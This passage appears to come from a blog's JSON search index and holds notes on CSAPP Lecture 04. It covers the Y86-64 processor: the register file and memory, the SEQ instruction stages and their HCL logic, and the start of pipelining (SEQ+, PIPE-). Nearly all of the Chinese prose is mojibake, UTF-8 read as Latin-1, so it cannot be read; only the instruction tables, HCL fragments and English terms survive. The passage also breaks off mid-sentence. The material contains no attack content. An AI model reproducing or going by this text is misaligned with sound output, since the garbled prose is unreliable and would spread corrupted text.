**éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆå†…å­˜ï¼‰ï¼š**å­˜å‚¨å¤šä¸ªå­—ï¼Œç”¨åœ°å€æ¥é€‰æ‹©è¯»å†™å“ªä¸ªå­—ã€‚åŒ…æ‹¬ï¼š **å¤„ç†å™¨çš„è™šæ‹Ÿå†…å­˜ç³»ç»Ÿï¼š**é€šè¿‡æ“ä½œç³»ç»Ÿå¯¹å­˜å‚¨å™¨è¿›è¡ŒæŠ½è±¡ï¼Œä½¿å¾—å¤„ç†å™¨å¯ä»¥åœ¨å¾ˆå¤§çš„åœ°å€ç©ºé—´ä¸­è®¿é—®ï¼Œåœ°å€ä¸ºè™šæ‹Ÿå†…å­˜çš„ç´¢å¼•å€¼ã€‚ **å¯„å­˜å™¨æ–‡ä»¶ï¼š**æ˜¯ä¸€ä¸ªä»¥å¯„å­˜å™¨æ ‡è¯†ç¬¦ä¸ºåœ°å€ï¼Œå­˜å‚¨ç€å¯¹åº”ç¨‹åºå¯„å­˜å™¨å€¼çš„éšæœºè®¿é—®å­˜å‚¨å™¨ã€‚åœ¨IA32æˆ–Y86-64å¤„ç†å™¨ä¸­ï¼Œæœ‰15ä¸ªç¨‹åºå¯„å­˜å™¨ï¼ˆ%rax~%r14ï¼‰ã€‚ è¿™é‡Œè¦æ³¨æ„åŒºåˆ†æœºå™¨çº§ç¼–ç¨‹ä¸­çš„å¯„å­˜å™¨å’Œç¡¬ä»¶ä¸­çš„å¯„å­˜å™¨ **ç¡¬ä»¶ï¼š**å¯„å­˜å™¨æŒ‡çš„æ˜¯æ—¶é’Ÿå¯„å­˜å™¨ï¼Œç›´æ¥å°†å®ƒçš„è¾“å…¥å’Œè¾“å‡ºè¿æ¥åˆ°ç”µè·¯çš„å…¶ä»–éƒ¨åˆ†ã€‚è¿™é‡Œç§°ä¸ºç¡¬ä»¶å¯„å­˜å™¨ã€‚ **æœºå™¨çº§ç¼–ç¨‹ï¼š**å¯„å­˜å™¨ä»£è¡¨çš„æ˜¯å­˜å‚¨åœ¨å¯„å­˜å™¨æ–‡ä»¶ä¸­çš„ï¼ŒCPUä¸­å°‘æ•°å¯å¯»å€çš„å­—ï¼Œåœ°å€ä¸ºå¯„å­˜å™¨æ ‡è¯†ç¬¦ã€‚è¿™é‡Œç§°ä¸ºç¨‹åºå¯„å­˜å™¨ã€‚ ç¡¬ä»¶å¯„å­˜å™¨ï¼š å½“è§¦å‘æ²¿æ—¶ï¼Œå¯„å­˜å™¨çš„è¾“å‡ºçŠ¶æ€æ‰ä¼šå˜æˆæ–°å€¼ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå¯„å­˜å™¨çš„çŠ¶æ€ä¼šä¸€ç›´ä¿å­˜ã€‚ Y86-64å¤„ç†å™¨ä¼šä½¿ç”¨ç¡¬ä»¶å¯„å­˜å™¨ä¿å­˜ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ã€æ¡ä»¶ä»£ç ï¼ˆCCï¼‰å’Œç¨‹åºçŠ¶æ€ï¼ˆStatï¼‰ã€‚ å¯„å­˜å™¨æ–‡ä»¶ï¼š å¯„å­˜å™¨æ–‡ä»¶åŒ…å«ä¸¤ä¸ªè¯»ç«¯å£å’Œä¸€ä¸ªå†™ç«¯å£ï¼Œæ„å‘³ç€èƒ½è¯»å–ä¸¤ä¸ªç¨‹åºå¯„å­˜å™¨çš„åŒæ—¶å¯¹ç¬¬ä¸‰ä¸ªç¨‹åºå¯„å­˜å™¨è¿›è¡Œå†™æ“ä½œã€‚è¿™é‡Œçš„åœ°å€å°±æ˜¯ç¨‹åºå¯„å­˜å™¨æ ‡è¯†ç¬¦ã€‚ å¯„å­˜å™¨æ–‡ä»¶çš„å†™å…¥æ“ä½œå—æ—¶é’Ÿä¿¡å·æ§åˆ¶ï¼Œåªæœ‰å½“æ—¶é’Ÿä¸ºé«˜ç”µå¹³æ—¶ï¼Œæ‰å°†valWä¸­çš„å€¼å†™å…¥dstwæŒ‡ç¤ºçš„ç¨‹åºå¯„å­˜å™¨ä¸­ã€‚ è™šæ‹Ÿå†…å­˜ç³»ç»Ÿï¼š å¤„ç†å™¨ç”¨è™šæ‹Ÿå†…å­˜æ¥ä¿å­˜ç¨‹åºæ•°æ®ã€‚readå’Œwriteæ˜¯ä¸¤ä¸ªæ ‡å¿—ä½ï¼Œç”¨æ¥æ§åˆ¶å½“å‰æ˜¯è¦è¯»è¿˜æ˜¯å†™ã€‚åŒ…å«é€šè¿‡é€»è¾‘ç”µè·¯å®ç°çš„è¾¹ç•Œæ£€æŸ¥ï¼Œå¦‚æœåœ°å€è¶…è¿‡è™šæ‹Ÿå†…å­˜åœ°å€ç©ºé—´ï¼Œå°±ä¼šä½¿å¾—error=1ã€‚ è™šæ‹Ÿå†…å­˜çš„å†™å…¥æ“ä½œå—æ—¶é’Ÿä¿¡å·æ§åˆ¶ï¼Œåªæœ‰å½“write=1å¹¶ä¸”æ—¶é’Ÿä¸ºé«˜ç”µå¹³æ—¶ï¼Œæ‰ä¼šå°†data inçš„æ•°æ®ä¿å­˜åˆ°å¯¹åº”åœ°å€çš„ä½ç½®ã€‚ ","date":"2021-02-04","objectID":"/csapp-lecture-04/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#hcl"},{"categories":["Pwning"],"content":"Y86-64çš„é¡ºåºå®ç°å¤„ç†ä¸€æ¡æŒ‡ä»¤æˆ‘ä»¬å¯ä»¥å°†å…¶åˆ’åˆ†æˆè‹¥å¹²ä¸ªé˜¶æ®µï¼š **å–æŒ‡ï¼ˆFetchï¼‰ï¼š**æ ¹æ®ç¨‹åºè®¡æ•°å™¨PCä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤å­—èŠ‚ã€‚ç„¶åå®Œæˆä»¥ä¸‹æ­¥éª¤ ä»æŒ‡ä»¤ä¸­æå–å‡ºæŒ‡ä»¤æŒ‡ç¤ºç¬¦å­—èŠ‚ï¼Œå¹¶ä¸”ç¡®å®šå‡ºæŒ‡ä»¤ä»£ç ï¼ˆicodeï¼‰å’ŒæŒ‡ä»¤åŠŸèƒ½ï¼ˆifunï¼‰ å¦‚æœå­˜åœ¨å¯„å­˜å™¨æŒ‡ç¤ºç¬¦ï¼Œåˆ™ä»æŒ‡ä»¤ä¸­ç¡®å®šä¸¤ä¸ªå¯„å­˜å™¨æ ‡è¯†ç¬¦rAå’ŒrB å¦‚æœå­˜åœ¨å¸¸æ•°å­—ï¼Œåˆ™ä»æŒ‡ä»¤ä¸­ç¡®å®šValC æ ¹æ®æŒ‡ä»¤æŒ‡ä»¤é•¿åº¦ä»¥åŠæŒ‡ä»¤åœ°å€ï¼Œå¯ç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€valP **è¯‘ç ï¼ˆDecodeï¼‰ï¼š**å¦‚æœå­˜åœ¨rAå’ŒrBï¼Œåˆ™è¯‘ç é˜¶æ®µä¼šä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å–rAå’ŒrBçš„å€¼valAå’ŒvalBã€‚å¯¹äºpushå’ŒpopæŒ‡ä»¤ï¼Œè¯‘ç é˜¶æ®µè¿˜ä¼šä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å–%rspçš„å€¼ã€‚ **æ‰§è¡Œï¼ˆExecuteï¼‰ï¼š**ç®—æœ¯é€»è¾‘å•å…ƒï¼ˆALUï¼‰ä¼šæ ¹æ®ifunçš„å€¼æ‰§è¡Œå¯¹åº”çš„è®¡ç®—ï¼Œå¾—åˆ°ç»“æœvalEï¼ŒåŒ…æ‹¬ è®¡ç®—è¿ç®—ç»“æœï¼Œä¼šè®¾ç½®æ¡ä»¶ç çš„å€¼ï¼Œåˆ™æ¡ä»¶ä¼ é€å’Œè·³è½¬æŒ‡ä»¤ä¼šæ ¹æ®ifunæ¥ç¡®å®šæ¡ä»¶ç ç»„åˆï¼Œç¡®å®šæ˜¯å¦è·³è½¬æˆ–ä¼ é€ã€‚ 2. è®¡ç®—å†…å­˜å¼•ç”¨çš„æœ‰æ•ˆåœ°å€ 3. å¢åŠ æˆ–å‡å°‘æ ˆæŒ‡é’ˆ **è®¿å­˜ï¼ˆMemoryï¼‰ï¼š**å†™å…¥å†…å­˜æˆ–ä»å†…å­˜è¯»å–æ•°æ®valMã€‚ **å†™å›ï¼ˆWrite Backï¼‰ï¼š**å°†ç»“æœå†™å…¥å¯„å­˜å™¨æ–‡ä»¶ä¸­ã€‚ **æ›´æ–°PCï¼ˆPC Updateï¼‰ï¼š**å°†PCæ›´æ–°ä¸ºvalPï¼Œä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ é˜¶æ®µ OPq rA, rB rrmovq rA, rB irmovq V, rB Fetch icode: ifunâ†Â $M_1[PC]$ rA: rBâ†Â $M_1[PC+1]$ valP â†Â PC+2 icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valP â† PC+2 icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valC â†Â $M_s[PC+2]$ valP â† PC+10 Decode valA â†Â $R[rA]$ valB â†Â $R[rB]$ valA â†Â $R[rA]$ Execute valE â†Â valA or valBSet CC valE â† 0+valA valE â† 0+valC Memory Write Back R[rB] â†Â valE R[rB] â† valE R[rB] â† valE PC Update PC â†Â valP PC â† valP PC â† valP OPqä¸­ä¼šå°†ifunä¼ å…¥ç»™ALUæ¥ç¡®å®šOPçš„ç±»å‹ã€‚ é˜¶æ®µ rmmovq rA, D(rB) mrmovq D(rB), rA Fetch icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valC â† $M_s[PC+2]$ valP â† PC+2 icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valC â† $M_s[PC+2]$ valP â† PC+10 Decode valA â† $R[rA]$ valB â†Â $R[rB]$ valB â†Â $R[rB]$ Execute valE â† 0+valA valE â† 0+valC Memory $M_s[valE]$ â†Â valA valE â†Â $M_s[valE]$ Write Back R[rA] â† valM PC Update PC â† valP PC â† valP é˜¶æ®µ pushq rA popq rA Fetch icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valP â† PC+2 icode: ifunâ† $M_1[PC]$ rA: rBâ† $M_1[PC+1]$ valP â† PC+2 Decode valA â† $R[rA]$ valB â†Â R[%rsp]â€‹ valA â†Â R[%rsp] valB â†Â R[%rsp] Execute valE â† valB+(-8) valE â† valB+8 Memory $M_s[valE]$ â†Â valA valE â†Â $M_s[valE]$ Write Back R[%rsp] â†Â valE R[%rsp] â† valE R[rA] â† valM PC Update PC â† valP PC â† valP popåœ¨è¯‘ç é˜¶æ®µè¯»äº†ä¸¤æ¬¡æ ˆé¡¶æŒ‡é’ˆçš„å€¼ï¼Œè¿™æ˜¯ä¸ºäº†ä½¿åç»­æµç¨‹å’Œåˆ«çš„æŒ‡ä»¤ç›¸ä¼¼ã€‚ é˜¶æ®µ jxx Dest call Dest ret Fetch icode: ifunâ† $M_1[PC]$ valC â† $M_s[PC+2]$ valP â† PC+9 icode: ifunâ† $M_1[PC]$ valC â† $M_s[PC+2]$ valP â† PC+9 icode: ifunâ† $M_1[PC]$ valP â† PC+1 Decode valB â† R[%rsp] valA â† R[%rsp]valB â† R[%rsp] Execute Cnd â†Â Cond(CC, ifun) valE â† valB+(-8) valE â† valB+8 Memory $M_s[vale]$ â†Â valP valM â†Â $M_s[valA]$ Write Back R[%rsp] â† valE R[%rsp] â† valE PC Update PC â†Â Cnd? valC: valP PC â† valC PC â† valM SEQ æ•°æ®å†…å­˜å’ŒæŒ‡ä»¤å†…å­˜éƒ½æ˜¯åœ¨ç›¸åŒçš„å†…å­˜ç©ºé—´ä¸­ï¼Œåªæ˜¯æ ¹æ®ä¸åŒçš„åŠŸèƒ½å¯¹å…¶è¿›è¡Œåˆ’åˆ† å¯„å­˜å™¨æ–‡ä»¶åŒ…å«ä¸¤ä¸ªè¯»ç«¯å£Aå’ŒBï¼Œä»¥åŠä¸¤ä¸ªå†™ç«¯å£Må’ŒEï¼Œåˆ†åˆ«æ¥æ”¶æ¥è‡ªå†…å­˜çš„å€¼valMä»¥åŠALUè®¡ç®—çš„ç»“æ„valEã€‚ PCæ›´æ–°çš„å€¼å¯èƒ½æ¥è‡ªäºï¼šä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€valPã€æ¥è‡ªå†…å­˜çš„å€¼valMã€è°ƒç”¨æŒ‡ä»¤æˆ–è·³è½¬æŒ‡ä»¤çš„ç›®æ ‡åœ°å€valCã€‚ ç™½è‰²æ–¹æ¡†ä¸ºæ—¶é’Ÿå¯„å­˜å™¨ï¼›è“è‰²æ–¹æ¡†ä¸ºç¡¬ä»¶å•å…ƒï¼Œå½“åšé»‘ç›’å­è€Œä¸å…³å¿ƒç»†èŠ‚è®¾è®¡ï¼›ç™½è‰²åœ†åœˆè¡¨ç¤ºçº¿è·¯åå­—ã€‚ å®½åº¦ä¸ºå­—é•¿çš„æ•°æ®ä½¿ç”¨ç²—çº¿ï¼›å®½åº¦ä¸ºå­—èŠ‚æˆ–æ›´çª„çš„æ•°æ®ç”¨ç»†çº¿ï¼›å•ä¸ªä½çš„æ•°æ®ç”¨è™šçº¿ï¼Œä¸»è¦è¡¨ç¤ºæ§åˆ¶å€¼ã€‚ ç°è‰²åœ†è§’çŸ©å½¢è¡¨ç¤ºæ§åˆ¶é€»è¾‘å—ï¼Œèƒ½åœ¨ä¸åŒç¡¬ä»¶å•å…ƒä¹‹é—´ä¼ é€’æ•°æ®ï¼Œä»¥åŠæ“ä½œè¿™äº›ç¡¬ä»¶å•å…ƒï¼Œä½¿å¾—å¯¹æ¯ä¸ªä¸åŒçš„æŒ‡ä»¤æ‰§è¡ŒæŒ‡å®šçš„è¿ç®—ã€‚ SEQçš„å®ç°åŒ…æ‹¬ç»„åˆé€»è¾‘å’Œä¸¤ç§å­˜å‚¨å™¨ï¼šæ—¶é’Ÿå¯„å­˜å™¨ï¼ˆç¨‹åºè®¡æ•°å™¨å’Œæ¡ä»¶ç å¯„å­˜å™¨ï¼‰å’Œéšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆå¯„å­˜å™¨æ–‡ä»¶ã€æŒ‡ä»¤å†…å­˜å’Œæ•°æ®å†…å­˜ï¼‰ã€‚æˆ‘ä»¬çŸ¥é“ç»„åˆé€»è¾‘å’Œå­˜å‚¨å™¨çš„è¯»å–æ˜¯æ²¡æœ‰æ—¶åºçš„ï¼Œåªè¦è¾“å…¥ä¸€ç»™å®šï¼Œè¾“å‡ºå°±ä¼šå‘ç”Ÿå¯¹åº”çš„å˜åŒ–ã€‚ä½†æ˜¯å­˜å‚¨å™¨çš„å†™å…¥æ˜¯å—åˆ°æ—¶é’Ÿçš„æ§åˆ¶çš„ï¼Œåªæœ‰å½“æ—¶é’Ÿä¸ºé«˜ç”µä½æ—¶ï¼Œæ‰ä¼šå°†å€¼å†™å…¥å­˜å‚¨å™¨ä¸­ã€‚ æ‰€ä»¥æ¶‰åŠåˆ°å†™æ•°æ®çš„å­˜å‚¨å™¨ï¼ˆç¨‹åºè®¡æ•°å™¨ã€æ¡ä»¶ç å¯„å­˜å™¨ã€å¯„å­˜å™¨æ–‡ä»¶å’Œæ•°æ®å†…å­˜ï¼‰å°±éœ€è¦å¯¹æ—¶åºè¿›è¡Œæ˜ç¡®çš„æ§åˆ¶ï¼Œæ‰èƒ½æ§åˆ¶å¥½æŒ‡ä»¤å„é˜¶æ®µçš„æ‰§è¡Œé¡ºåºã€‚ä¸ºäº†ä¿è¯æ¯æ¡æŒ‡ä»¤æ‰§è¡Œçš„ç»“æœèƒ½å’Œä¸Šä¸€èŠ‚ä¸­ä»‹ç»çš„é¡ºåºæ‰§è¡Œçš„ç»“æœç›¸åŒï¼Œæˆ‘ä»¬è¦ä¿è¯æŒ‡ä»¤çš„è®¡ç®—ä¸ä¼šå›è¯»ï¼Œå³å¤„ç†å™¨ä¸éœ€è¦ä¸ºäº†å®Œæˆä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œè€Œå»è¯»å–ç”±è¯¥æŒ‡ä»¤æ›´æ–°çš„çŠ¶æ€ã€‚å› ä¸ºè¯¥æŒ‡ä»¤æ›´æ–°çš„çŠ¶æ€æ˜¯å†™å…¥æ•°æ®ï¼Œéœ€è¦ç»è¿‡ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œå¦‚æœè¯¥æŒ‡ä»¤éœ€è¦è¯»å–æ›´æ–°è¿‡çš„çŠ¶æ€ï¼Œå°±éœ€è¦ç©ºå‡ºä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ SEQçš„HCLè¡¨è¾¾å¼ Name Hex Meaning IHALT 0 halt INOP 1 nop IRRMOVQ 2 rrmovq IIRMOVQ 3 irmovq IRMMOVQ 4 rmmovq IMRMOVQ 5 mrmovq IOPL 6 æ•´æ•°è¿ç®—æŒ‡ä»¤ IJXX 7 è·³è½¬æŒ‡ä»¤ ICALL 8 call IRET 9 ret IPUSHQ A pushq IPOPQ B popq FNONE 0 é»˜è®¤åŠŸèƒ½ç  RRSP 4 %rspçš„å¯„å­˜å™¨ID RNONE F æ²¡æœ‰å¯„å­˜å™¨æ–‡ä»¶è®¿é—® ALUADD 0 åŠ æ³•è¿ç®— SAOK 1 æ­£å¸¸æ“ä½œ SADR 2 åœ°å€å¼‚å¸¸ SINS 3 éæ³•æŒ‡ä»¤ SHLT 4 haltçŠ¶æ€ç  å–æŒ‡ icodeä¸ºç¬¬ä¸€å­—èŠ‚çš„é«˜4ä½ï¼Œå½“æŒ‡ä»¤åœ°å€è¶Šç•Œæ—¶ï¼ŒæŒ‡ä»¤å†…å­˜ä¼šè¿”å›imem_errorä¿¡å·ï¼Œæ­¤æ—¶ç›´æ¥å°†å…¶è¡¨ç¤ºä¸ºnopæŒ‡ä»¤ï¼Œå¦åˆ™è·å¾—é«˜4ä½å€¼ word icode = [ imem_error : INOP; 1 : imem_icode; ]; ifunä¸ºç¬¬ä¸€å­—èŠ‚çš„ä½4ä½ï¼Œå½“å‡ºç°imem_errorä¿¡å·æ—¶ï¼Œä¼šä½¿ç”¨é»˜è®¤åŠŸèƒ½ç ï¼Œå¦åˆ™è·å¾—ä½4ä½å€¼ word ifun = [ imem_error : FNONE; 1 : imem_ifun; ]; instr_validè¡¨ç¤ºæ˜¯å¦ä¸ºåˆæ³•æŒ‡ä»¤ bool instr_valid = icode in { INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ }; need_regidsè¡¨ç¤ºè¯¥æŒ‡ä»¤å¦åŒ…å«å¯„å­˜å™¨æŒ‡ç¤ºç¬¦å­—èŠ‚ï¼Œå¦‚æœæŒ‡ä»¤ä¸å«æœ‰å¯„å­˜å™¨æŒ‡ç¤ºç¬¦å­—èŠ‚ï¼Œåˆ™ä¼šå°†å…¶èµ‹å€¼ä¸º0xFFã€‚ bool need_regids = icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, IIRMOVQ, IRMMOVQ, IMRMOVQ }; need_valCè¡¨ç¤ºè¯¥æŒ‡ä»¤æ˜¯å¦å«æœ‰å¸¸æ•°å­—èŠ‚ bool need_valC = icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL }; PCå¢åŠ å™¨ä¼šæ ¹æ®PCå€¼ã€need_valCå’Œneed_regidsæ¥ç¡®å®švalPå€¼ï¼Œåˆ™ valP = PC+1+need_regids+8*need_valC è¯‘ç ä¸å†™å› å†™å…¥çš„ç›®çš„dstEå’ŒdstM word dstE = [ icode in {IRRMOVQ} \u0026\u0026 Cnd : rB; #cmovXXæŒ‡ä»¤ï¼Œå¯ä»¥å°†å…¶çœ‹æˆæ˜¯rrmovqå’Œæ¡ä»¶ä¿¡å·Cndçš„ç»„åˆ icode in {IIRMOVQ, IOPQ} :","date":"2021-02-04","objectID":"/csapp-lecture-04/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#y86-64çš„é¡ºåºå®ç°"},{"categories":["Pwning"],"content":"æµæ°´çº¿æˆ‘ä»¬å‘ç°ï¼ŒæŒ‡ä»¤æ‰§è¡Œçš„ä¸åŒé˜¶æ®µæ˜¯åœ¨å¤„ç†å™¨çš„ä¸åŒç¡¬ä»¶éƒ¨åˆ†è¿›è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©ä¸åŒçš„æŒ‡ä»¤åŒæ—¶è¿è¡Œï¼Œåªè¦å®ƒä»¬å¤„åœ¨ä¸åŒçš„é˜¶æ®µã€‚ è‹¥ä¸ä½¿ç”¨æµæ°´çº¿ï¼Œæ¯ä¸ªæŒ‡ä»¤éƒ½è¦ç­‰å¾…å…¶ä¸Šä¸€ä¸ªæŒ‡ä»¤å®Œæˆåæ‰å¯ä»¥è¿›è¡Œï¼Œè¿™é™ä½äº†ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ã€‚ä½¿ç”¨æµæ°´çº¿å¯ä»¥æé«˜ç³»ç»Ÿçš„ååé‡ï¼Œä½†æ˜¯å›è½»å¾®å¢åŠ å»¶è¿Ÿã€‚ æƒ³è¦ååé‡æœ€å¤§ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾—æ—¶é’Ÿå‘¨æœŸå°½å¯èƒ½å°ï¼Œè€Œæ—¶é’Ÿå‘¨æœŸå—åˆ°æœ€æ…¢çš„ç»„åˆé€»è¾‘çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æœ€å°çš„ç»„åˆé€»è¾‘çš„æ—¶é—´åŠ ä¸Šä¸€ä¸ªå¯„å­˜å™¨çš„æ—¶å»¶ä½œä¸ºæ—¶é’Ÿå‘¨æœŸã€‚æƒ³è¦å»¶è¿Ÿæœ€å°ï¼Œå°±ä¸ä½¿ç”¨æµæ°´çº¿ã€‚ å¦‚æœå°†æ¯ä¸ªç»„åˆé€»è¾‘å˜å¾—æ›´å°ï¼Œè™½ç„¶å¯ä»¥å¤§å¤§å¢åŠ ååé‡ï¼Œä½†æ˜¯å»¶è¿Ÿåœ¨ä¸€ä¸ªæ—¶é—´å‘¨æœŸçš„å æ¯”ä¹Ÿå¢åŠ ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¤„ç†å™¨ä¸­æŸäº›ç¡¬ä»¶å•å…ƒï¼Œå¦‚ALUå’Œå†…å­˜ï¼Œå¹¶ä¸èƒ½è¢«åˆ’åˆ†æˆå¤šä¸ªå»¶è¿Ÿå¾ˆå°çš„å•å…ƒã€‚æ‰€ä»¥ï¼Œå¾ˆéš¾æ‰¾åˆ°ä¸€ä¸ªç»Ÿä¸€çš„è¶³å¤Ÿå°çš„å•å…ƒæ¥å¹³è¡¡å„ä¸ªé˜¶æ®µï¼Œåœ¨Y86-64ä¸­ï¼Œä¸å»æ·±å…¥è¿™éƒ¨åˆ†ç ”ç©¶ã€‚ å¸¦åé¦ˆçš„æµæ°´çº¿ åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç›¸é‚»çš„ä¸¤æ¡æŒ‡ä»¤æ•°æ®æ˜¯æœ‰å…³è”çš„ï¼Œå³ä¸‹ä¸€æ¡æŒ‡ä»¤å¯èƒ½å›ç”¨åˆ°ä¸Šä¸€æ¡æŒ‡ä»¤è®¡ç®—çš„ç»“æœï¼Œè¿™è¢«ç§°ä¸ºæ•°æ®ç›¸å…³ï¼ˆdata dependencyï¼‰ã€‚å¦ä¸€ç§æƒ…å†µï¼Œæ˜¯å½“è·³è½¬æŒ‡ä»¤åœ¨è¿›è¡Œæ—¶ï¼Œå…¶åçš„ä¸¤ä¸ªæŒ‡ä»¤æ˜¯æ‰§è¡Œè·³è½¬å‰çš„ï¼Œè¿˜æ˜¯è·³è½¬åçš„ï¼Œè¿™æˆä¸ºæ§åˆ¶ç›¸å…³ï¼ˆcontrol dependencyï¼‰ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ä¸€ç§æ€è·¯æ˜¯åŠ å…¥åé¦ˆè·¯çº¿ï¼Œä½†æ˜¯æŸä¸€é˜¶æ®µäº§ç”Ÿçš„ç»“æœä¼šæˆä¸ºNä¸ªé˜¶æ®µåçš„è¾“å…¥ï¼Œè€Œä¸æ˜¯å½“å‰ç¨‹åºçš„çŠ¶æ€ï¼Œè¿™æ”¹å˜äº†ç³»ç»Ÿçš„è¡Œä¸ºï¼Œåœ¨å®é™…ä¸­æˆ‘ä»¬æ— æ³•æ¥å—è¿™æ ·çš„åæœã€‚æ‰€ä»¥è¿™ç§æ–¹å¼å¹¶ä¸é€‚ç”¨äºæµæ°´çº¿åŒ–çš„Y86-64ã€‚ SEQ+ ä¸ºäº†å¹³è¡¡ä¸€ä¸ªæµæ°´çº¿ç³»ç»Ÿå„ä¸ªé˜¶æ®µçš„å»¶è¿Ÿï¼Œéœ€è¦ä½¿ç”¨ç”µè·¯é‡å®šæ—¶ï¼ˆCircuit Retimingï¼‰åœ¨ä¸æ”¹å˜é€»è¾‘è¡Œä¸ºçš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹ç³»ç»Ÿçš„çŠ¶æ€è¡¨ç¤ºã€‚é¡ºåºå®ç°çš„SEQä¸­ï¼Œæ›´æ–°PCé˜¶æ®µæ˜¯åœ¨æ—¶é’Ÿå‘¨æœŸç»“æŸæ—¶æ‰æ‰§è¡Œçš„ï¼Œé€šè¿‡ç»„åˆç”µè·¯è®¡ç®—å¾—åˆ°çš„icodeã€Cndã€valCã€valMå’ŒvalPé€šè¿‡ç»„åˆç”µè·¯è®¡ç®—å¾—åˆ°æ–°çš„PCï¼Œå°†å…¶ä¿å­˜åˆ°PCçš„æ—¶é’Ÿå¯„å­˜å™¨ä¸­ã€‚ä½†æ˜¯è¿™äº›å€¼æ˜¯åœ¨ä¸åŒé˜¶æ®µä¸­è®¡ç®—å‡ºæ¥çš„ï¼Œæ‰€ä»¥SEQ+æ–°å¢äº†ä¸€ç³»åˆ—çŠ¶æ€å¯„å­˜å™¨æ¥ä¿å­˜ä¹‹å‰è®¡ç®—å‡ºæ¥çš„ç»“æœï¼Œç„¶åå°†æ›´æ–°PCé˜¶æ®µæ”¾åˆ°äº†æ—¶é’Ÿå‘¨æœŸå¼€å§‹æ‰§è¡Œï¼Œè¿™æ ·åœ¨æ¯ä¸ªé˜¶æ®µæ—¶é’Ÿå‘¨æœŸå˜æˆé«˜ç”µå¹³æ—¶å°±ä¼šå°†è¯¥é˜¶æ®µè®¡ç®—å‡ºæ¥çš„å€¼ä¿å­˜åˆ°çŠ¶æ€å¯„å­˜å™¨ä¸­ï¼Œç„¶åPCé€»è¾‘ç”µè·¯å°±èƒ½æ ¹æ®å½“å‰çš„çŠ¶æ€å¯„å­˜å™¨çš„å€¼æ¥é¢„æµ‹ä¸‹ä¸€æ­¥çš„PCå€¼ã€‚ æ³¨æ„åœ¨SEQ+ä¸­ï¼ŒPCæ˜¯åŠ¨æ€ç§»åŠ¨çš„ï¼Œå³æ ¹æ®æ¯ä¸€é˜¶æ®µçš„å€¼æ¥ç§»åŠ¨ï¼Œæ²¡æœ‰ç‰¹å®šçš„ç¡¬ä»¶å¯„å­˜å™¨æ¥ä¿å­˜ã€‚ æ’å…¥æµæ°´çº¿çš„PIPE- åˆ†åˆ«æ’å…¥äº†5ä¸ªæµæ°´çº¿å¯„å­˜å™¨ç”¨æ¥ä¿å­˜åç»­é˜¶æ®µæ‰€éœ€çš„ä¿¡å·ï¼Œç¼–å·ä¸ºFã€Dã€Eã€Må’ŒWã€‚æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨Då’ŒEä¸­éƒ½æœ‰statä¿¡å·ï¼Œåˆ†åˆ«è¡¨ç¤ºä¸ºD_statå’ŒE_statã€‚åœ¨å–æŒ‡é˜¶æ®µå’Œè®¿å­˜é˜¶æ®µéƒ½æœ‰é€šè¿‡é€»è¾‘è®¡ç®—å¾—åˆ°statä¿¡å·ï¼Œåˆ†åˆ«è¡¨ç¤ºä¸ºf_statå’Œm_statã€‚ åœ¨SEQ+ä¸­ï¼Œåœ¨è¯‘ç é˜¶æ®µé€šè¿‡é€»è¾‘ç”µè·¯è®¡ç®—å¾—åˆ°dstEå’ŒdstMï¼Œä¼šç›´æ¥å°†å…¶è¿æ¥åˆ°å¯„å­˜å™¨æ–‡ä»¶çš„å†™ç«¯å£çš„åœ°å€è¾“å…¥ï¼Œå½“è®¡ç®—å‡ºvalEå’ŒvalMæ—¶ç›´æ¥å†™å›åˆ°å¯¹åº”å¯„å­˜å™¨ä¸­ã€‚ä½†æ˜¯dstEå’ŒdstMæ˜¯åœ¨è¯‘ç é˜¶æ®µè®¡ç®—å‡ºæ¥çš„ï¼Œè€ŒvalEæ˜¯åœ¨æ‰§è¡Œé˜¶æ®µè®¡ç®—å¾—åˆ°ï¼ŒvalMæ˜¯åœ¨è®¿å­˜é˜¶æ®µè·å¾—çš„ï¼Œåœ¨æµæ°´çº¿ç³»ç»ŸPIPE-ä¸­å„ä¸ªé˜¶æ®µæ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œå½“æŸæ¡æŒ‡ä»¤è¿è¡Œåˆ°å†™å›é˜¶æ®µæ—¶ï¼Œå¾—åˆ°äº†valEå’ŒvalMï¼Œä½†æ˜¯å½“å‰çš„dstEå’ŒdstMæ˜¯å¤„äºè¯‘ç 